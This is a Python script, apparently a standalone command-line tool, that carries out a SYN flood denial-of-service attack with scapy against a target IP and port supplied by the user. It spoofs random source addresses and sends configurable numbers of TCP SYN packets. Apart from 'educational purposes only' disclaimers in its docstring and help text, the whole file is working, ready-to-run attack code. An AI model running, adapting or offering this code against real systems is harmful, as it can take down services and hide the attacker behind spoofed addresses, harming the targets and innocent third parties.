#!/usr/bin/env python3
"""
SYN Flood Attack Script

This script performs a SYN flood attack by sending a large number of TCP SYN
packets to a target IP and port. This is for educational purposes only.

WARNING: Only use this script in controlled, authorized environments.
Unauthorized use of this script is illegal and unethical.
"""

import argparse
import random
import sys
import time

try:
    from scapy.all import IP, TCP, send, RandShort
except ImportError:
    print("Error: scapy is required. Install it with: pip install scapy")
    sys.exit(1)


def generate_random_ip():
    """Generate a random IP address for source IP spoofing."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def syn_flood(target_ip, target_port, packet_count, delay=0, verbose=True):
    """
    Perform SYN flood attack on the target.
    
    Args:
        target_ip: Target IP address
        target_port: Target port number
        packet_count: Number of SYN packets to send
        delay: Delay between packets in seconds
        verbose: Print progress messages
    """
    if verbose:
        print(f"[*] Starting SYN flood attack on {target_ip}:{target_port}")
        print(f"[*] Sending {packet_count} SYN packets...")
    
    sent_count = 0
    start_time = time.time()
    
    for i in range(packet_count):
        # Generate random source IP for spoofing
        src_ip = generate_random_ip()
        
        # Create IP packet with spoofed source
        ip_layer = IP(src=src_ip, dst=target_ip)
        
        # Create TCP SYN packet with random source port
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S", seq=random.randint(1000, 9000))
        
        # Combine layers and send
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)
        
        sent_count += 1
        
        if verbose and (i + 1) % 100 == 0:
            elapsed = time.time() - start_time
            rate = sent_count / elapsed if elapsed > 0 else 0
            print(f"[*] Sent {sent_count} packets ({rate:.2f} packets/sec)")
        
        if delay > 0:
            time.sleep(delay)
    
    elapsed = time.time() - start_time
    if verbose:
        print(f"[+] Attack completed: {sent_count} packets sent in {elapsed:.2f} seconds")
        print(f"[+] Average rate: {sent_count / elapsed:.2f} packets/sec")
    
    return sent_count


def main():
    """Main function to parse arguments and run the attack."""
    parser = argparse.ArgumentParser(
        description="SYN Flood Attack Tool (Educational Purposes Only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
WARNING: This tool is for educational purposes only.
Unauthorized use against systems you do not own or have explicit
permission to test is illegal and unethical.
        """
    )
    
    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Target IP address"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=80,
        help="Target port (default: 80)"
    )
    parser.add_argument(
        "-c", "--count",
        type=int,
        default=1000,
        help="Number of packets to send (default: 1000)"
    )
    parser.add_argument(
        "-d", "--delay",
        type=float,
        default=0,
        help="Delay between packets in seconds (default: 0)"
    )
    parser.add_argument(
        "-q", "--quiet",
        action="store_true",
        help="Suppress output"
    )
    
    args = parser.parse_args()
    
    try:
        syn_flood(
            target_ip=args.target,
            target_port=args.port,
            packet_count=args.count,
            delay=args.delay,
            verbose=not args.quiet
        )
    except PermissionError:
        print("Error: Root privileges required to send packets.")
        print("Run with sudo: sudo python syn_flood.py ...")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)


if __name__ == "__main__":
    main()
